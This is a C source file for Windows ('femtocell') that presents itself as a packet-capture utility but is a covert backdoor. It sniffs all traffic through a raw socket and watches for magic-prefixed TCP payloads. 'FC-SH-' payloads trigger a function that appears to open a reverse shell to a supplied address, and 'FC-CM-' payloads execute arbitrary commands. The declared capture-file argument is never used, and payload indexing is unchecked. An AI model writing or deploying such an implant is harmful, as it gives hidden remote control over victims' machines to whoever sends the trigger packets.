#include "femtocell.h"

int main(int argc, char** argv) 
{
	if (argc != 3) 
	{
		fprintf(stderr, "usage: %s <interface-ip> <capture-file>\n", argv[0]);
		exit(-1);
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);


	SOCKET sd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	if (sd == INVALID_SOCKET) 
	{
		fprintf(stderr, "socket() failed: %u", WSAGetLastError());
		exit(-1);
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(argv[1]);
	addr.sin_port = htons(0);

	int rc = bind(sd, (struct sockaddr*)&addr, sizeof(addr));
	if (rc == SOCKET_ERROR) 
	{
		fprintf(stderr, "bind() failed: %u", WSAGetLastError());
		exit(-1);
	}

	int value = RCVALL_IPLEVEL;
	DWORD out = 0;
	rc = WSAIoctl(sd, SIO_RCVALL, &value, sizeof(value), NULL, 0, &out, NULL, NULL);
	if (rc == SOCKET_ERROR) 
	{
		fprintf(stderr, "WSAIoctl() failed: %u", WSAGetLastError());
		exit(-1);
	}

	unsigned char buffer[BUFFER_SIZE_ETH + BUFFER_SIZE_PKT];
	memset(buffer, 0, sizeof(buffer));
	buffer[BUFFER_OFFSET_ETH + 12] = 0x08;

	while (1) 
	{
		int rc = recv(sd, (char*)buffer + BUFFER_OFFSET_IP, BUFFER_SIZE_IP, 0);
		if (rc == SOCKET_ERROR) 
		{
			fprintf(stderr, "recv() failed: %u", WSAGetLastError());
			exit(-1);
		}

		struct ip_hdr_s* ip_header = (buffer+BUFFER_OFFSET_IP);
		uint8_t l4_protocol = ip_header->ip_p;
		if (l4_protocol == 6) 
		{
			struct tcp_hdr_s* tcp_header = (buffer + BUFFER_OFFSET_L4);
			uint16_t sport = ntohs(tcp_header->th_sport);
			if (sport == SRC_PORT || sport == SRC_PORT_2)
			{
				uint16_t flag = (uint16_t)tcp_header->th_flags;
				BOOL push = (flag >> 3) % 2;
				if (push) 
				{
					char* data = (char*)(buffer + BUFFER_OFFSET_DATA);
					int buffoffdata = BUFFER_SIZE_TCP;
					int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_TCP;
					data[payloadLength - 1] = '\0';

					if (payloadLength > 6)
					{
						if (strncmp(data, "FC-SH-", 6) == 0)
						{
							char* rip = (char*)data + 6;
							rev(rip);
						}
						else if (strncmp(data, "FC-CM-", 6) == 0)
						{
							char* cmd = (char*)data + 6;
							exec(cmd);
						}
					}
				}
			}
		}
	}
	return 0;
}

